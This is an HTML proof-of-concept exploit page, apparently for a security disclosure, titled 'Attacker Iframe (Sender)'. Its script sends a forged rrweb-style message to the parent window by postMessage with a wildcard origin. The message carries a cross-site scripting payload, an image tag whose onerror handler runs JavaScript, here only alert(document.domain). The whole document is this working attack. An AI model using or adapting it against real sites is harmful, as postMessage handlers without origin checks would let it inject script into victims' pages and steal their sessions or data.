<!DOCTYPE html>
<html>
<head>
    <title>Attacker Iframe (Sender)</title>
</head>
<body>
    <h2>Attacker Iframe Window</h2>
    <p style="color: blue;">This page is hosted on a different domain.</p>

    <script>
        // The malicious payload crafted to match the rrweb structure
        const maliciousPayload = {
            type: "rrweb",
            event: {
                data: {
                    // XSS Payload: Will execute JS when the image fails to load (src=x)
                    text: "<h1>Hacked!</h1><img src=x onerror=alert(document.domain)>"
                }
            },
            // FIX: Added the necessary comma here to prevent SyntaxError
            origin: window.location.origin,
            isCheckout: false
        };

        // Send the malicious message to the parent with the wildcard origin ("*")
        if (window.parent !== window) {
            window.parent.postMessage(maliciousPayload, "*");
            console.log("Malicious message sent to parent via postMessage.");
        }
    </script>
</body>
</html>
